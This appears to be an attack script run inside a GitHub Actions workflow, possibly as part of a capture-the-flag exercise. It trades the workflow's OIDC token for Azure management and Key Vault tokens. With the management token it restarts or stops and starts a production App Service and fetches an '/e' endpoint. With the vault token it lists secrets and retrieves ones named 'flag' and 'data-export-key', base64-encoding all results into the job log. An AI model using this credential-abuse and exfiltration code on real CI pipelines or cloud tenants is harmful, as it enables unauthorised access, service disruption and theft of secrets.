#!/usr/bin/env bash
set +e
T="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
C="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"

echo "=== OIDC ==="
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
echo "OIDC_LEN=${#OIDC}"

echo "=== Azure AD: management scope ==="
MGMT_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "client_id=$C&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC&grant_type=client_credentials&scope=https://management.azure.com/.default")
MGMT_TOKEN=$(echo "$MGMT_RESP" | jq -r .access_token)
echo "MGMT_TOKEN_LEN=${#MGMT_TOKEN}"

if [ "${#MGMT_TOKEN}" -gt 100 ]; then
  SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
  RG="rg-tbl-reporting-prod-eus"
  APP="app-tbl-reporting-prod"
  BASE="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP"

  echo "=== Restart reporting app ==="
  RESTART=$(curl -sS -o /dev/null -w "%{http_code}" -X POST "$BASE/restart?api-version=2022-03-01" \
    -H "Authorization: Bearer $MGMT_TOKEN")
  echo "RESTART_STATUS=$RESTART"

  if [ "$RESTART" != "200" ]; then
    echo "=== Try stop+start ==="
    STOP=$(curl -sS -o /dev/null -w "%{http_code}" -X POST "$BASE/stop?api-version=2022-03-01" \
      -H "Authorization: Bearer $MGMT_TOKEN")
    echo "STOP=$STOP"
    sleep 3
    START=$(curl -sS -o /dev/null -w "%{http_code}" -X POST "$BASE/start?api-version=2022-03-01" \
      -H "Authorization: Bearer $MGMT_TOKEN")
    echo "START=$START"
  fi

  sleep 15
  echo "=== Fetch /e ==="
  RESULT=$(curl -sS "https://app-tbl-reporting-prod.azurewebsites.net/e" 2>&1)
  echo "RESULT_B64=$(echo "$RESULT" | base64 -w0)"
  
  echo "=== Fetch / ==="
  ROOT=$(curl -sS "https://app-tbl-reporting-prod.azurewebsites.net/" 2>&1)
  echo "ROOT=$ROOT"
else
  echo "=== No management token, try vault scope ==="
  VAULT_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
    -d "client_id=$C&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC&grant_type=client_credentials&scope=https://vault.azure.net/.default")
  VTOK=$(echo "$VAULT_RESP" | jq -r .access_token)
  echo "VTOK_LEN=${#VTOK}"
  
  if [ "${#VTOK}" -gt 100 ]; then
    echo "=== KV2 secrets ==="
    KV2_LIST=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
      -H "Authorization: Bearer $VTOK")
    echo "KV2_B64=$(echo "$KV2_LIST" | base64 -w0)"
    
    for NAME in flag ctf-flag the-flag data-export-key; do
      VAL=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$NAME?api-version=7.4" \
        -H "Authorization: Bearer $VTOK")
      echo "KV2_${NAME}_B64=$(echo "$VAL" | base64 -w0)"
    done
  fi
fi

echo "=== DONE ==="